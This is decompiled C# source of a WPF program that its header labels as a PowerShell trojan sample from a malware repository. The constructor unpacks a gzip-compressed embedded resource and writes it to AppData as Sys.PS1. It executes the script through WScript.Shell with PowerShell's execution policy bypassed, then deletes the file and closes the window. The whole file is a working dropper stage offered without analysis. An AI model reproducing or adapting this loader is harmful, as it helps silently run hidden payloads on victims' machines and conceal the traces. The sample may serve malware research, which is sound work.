// Decompiled with JetBrains decompiler
// Type: WpfApp1.MainWindow
// Assembly: WpfApp1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8C7260DC-2DC2-4592-90BC-8D778D515FB1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.PowerShell.Kryptik.gen-8883f8b4a6890dd0dad9ac1ad89bf72d4b0ba6f82e6fd5aa1afaaeb6456b8aa7.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows;
using System.Windows.Markup;
using WpfApp1.Properties;

namespace WpfApp1
{
  public partial class MainWindow : Window, IComponentConnector
  {
    private bool _contentLoaded;

    public MainWindow()
    {
      this.InitializeComponent();
      byte[] bytes = this.Decompress(Resources.File);
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Sys.PS1";
      File.WriteAllBytes(path, bytes);
      object instance = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
      if (path.Contains(" "))
      {
        string str = "\"PowerShell -ExecutionPolicy Bypass -File '" + path + "'\"";
        // ISSUE: reference to a compiler-generated field
        if (MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__0 = CallSite<Action<CallSite, object, string, int>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<Type>) null, typeof (MainWindow), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[3]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__0.Target((CallSite) MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__0, instance, "PowerShell -ExecutionPolicy RemoteSigned -Command " + str, 0);
      }
      else
      {
        // ISSUE: reference to a compiler-generated field
        if (MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__1 == null)
        {
          // ISSUE: reference to a compiler-generated field
          MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__1 = CallSite<Action<CallSite, object, string, int>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", (IEnumerable<Type>) null, typeof (MainWindow), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[3]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__1.Target((CallSite) MainWindow.\u003C\u003Eo__0.\u003C\u003Ep__1, instance, "PowerShell -ExecutionPolicy RemoteSigned -File " + path, 0);
      }
      Thread.Sleep(5000);
      File.Delete(path);
      Application.Current.MainWindow.Close();
    }

    private byte[] Decompress(byte[] data)
    {
      using (MemoryStream memoryStream = new MemoryStream(data))
      {
        using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
        {
          using (MemoryStream destination = new MemoryStream())
          {
            gzipStream.CopyTo((Stream) destination);
            return destination.ToArray();
          }
        }
      }
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    public void InitializeComponent()
    {
      if (this._contentLoaded)
        return;
      this._contentLoaded = true;
      Application.LoadComponent((object) this, new Uri("/WpfApp1;component/mainwindow.xaml", UriKind.Relative));
    }

    [DebuggerNonUserCode]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    void IComponentConnector.Connect(int connectionId, object target) => this._contentLoaded = true;
  }
}
